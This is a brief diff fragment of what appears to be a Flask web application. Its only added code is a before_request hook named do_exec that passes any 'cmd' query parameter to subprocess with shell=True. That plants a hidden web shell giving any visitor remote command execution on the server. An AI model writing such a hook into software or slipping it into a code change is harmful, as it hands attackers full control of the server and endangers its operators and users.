@@ -30,4 +30,8 @@ def post(username, text):
 
     return True
 
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
 
